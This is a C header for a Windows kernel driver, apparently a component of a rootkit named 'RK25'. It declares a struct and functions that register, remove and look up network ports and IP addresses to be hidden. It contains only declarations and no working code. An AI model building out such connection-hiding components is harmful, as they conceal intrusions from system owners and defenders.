#ifndef _RK25_HIDE_NET_H_
#define _RK25_HIDE_NET_H_

#include <ntddk.h>
#include "../../../common/list/rk25_list.h"
#include "../../../common/net/rk25_net_convert.h"
#include "../../../common/rk25_dbg.h"
#include "../../common/hook/net/rk25_hook_net.h"

typedef struct _RK25_HIDE_NET_DATA {
	ULONG attr;
	USHORT port;
	ULONG ip;
} RK25_HIDE_NET_DATA, RK25_HND, *PRK25_HND;

VOID RK25HideNetInit();
VOID RK25HideNetFree();

BOOLEAN RK25HideNetAddByPort(ULONG attr, USHORT port);
BOOLEAN RK25HideNetAddByIP(ULONG attr, ULONG ip);

VOID RK25HideNetDelByPort(USHORT port, ULONG attr);
VOID RK25HideNetDelByIP(ULONG ip, ULONG attr);

PRK25_HND RK25HideNetGetByPort(USHORT port, ULONG attr);
PRK25_HND RK25HideNetGetByIP(ULONG ip, ULONG attr);

#endif // !_RK25_HIDE_NET_H_
